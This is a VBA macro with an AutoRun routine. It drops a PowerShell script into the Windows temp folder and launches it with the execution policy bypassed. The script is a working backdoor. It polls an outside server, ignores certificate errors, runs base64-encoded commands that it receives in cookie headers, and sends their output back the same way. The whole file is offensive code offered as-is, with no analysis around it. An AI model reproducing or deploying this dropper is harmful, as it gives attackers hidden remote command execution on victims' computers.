Sub AutoRun():
    ' dump the dropper
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set A = fso.CreateTextFile("C:\windows\temp\test.ps1", True)
    A.WriteLine (" $url = 'https://192.168.33.33'; ")
    A.WriteLine (" #Magic header - change as needed for both client and the server")
    A.WriteLine (" $m = '737060cd8c284d8af7ad3082f209582d';")
    A.WriteLine (" function w ")
    A.WriteLine (" { ")
    A.WriteLine ("     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; ")
    A.WriteLine ("     $r = [System.Net.HttpWebRequest]::Create($url); ")
    A.WriteLine ("     $r.Headers.Add('If-Match', $m); ")
    A.WriteLine ("     $p = [System.Net.WebRequest]::GetSystemWebProxy(); ")
    A.WriteLine ("         # handle credetnails ")
    A.WriteLine ("     $p.Credentials=[System.Net.CredentialCache]::DefaultCredentials; ")
    A.WriteLine ("     $r.proxy = $proxy; ")
    A.WriteLine ("     return $r; ")
    A.WriteLine (" } ")
    A.WriteLine (" ")
    A.WriteLine (" while ($true) ")
    A.WriteLine (" { ")
    A.WriteLine ("     $r = w; ")
    A.WriteLine ("     try { $p = $r.GetResponse(); } catch { continue; } ")
    A.WriteLine ("     $x = $p.GetResponseHeader('Set-Cookie'); ")
    A.WriteLine ("     if (![string]::IsNullOrEmpty($x)) ")
    A.WriteLine ("     { ")
    A.WriteLine ("         $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); ")
    A.WriteLine ("         #invoke and catch any exceptions ")
    A.WriteLine ("                 try { $o = invoke-expression '$c' 2>&1 | Out-String; } ")
    A.WriteLine ("         catch { $o = $_.Exception| Out-String; } ")
    A.WriteLine ("                 # get output back to the server in cookie ")
    A.WriteLine ("         $o = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o)) ")
    A.WriteLine ("         $r = w; ")
    A.WriteLine ("         $r.Headers.Add('Cookie', $o); ")
    A.WriteLine ("         $r.GetResponse().close(); ")
    A.WriteLine ("     } ")
    A.WriteLine ("     $p.close(); ")
    A.WriteLine (" } ")
    ' exec the command
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    retVal = Shell("powershell.exe -ExecutionPolicy Bypass -noprofile -noexit C:\windows\temp\test.ps1", vbNormalFocus)
End Sub
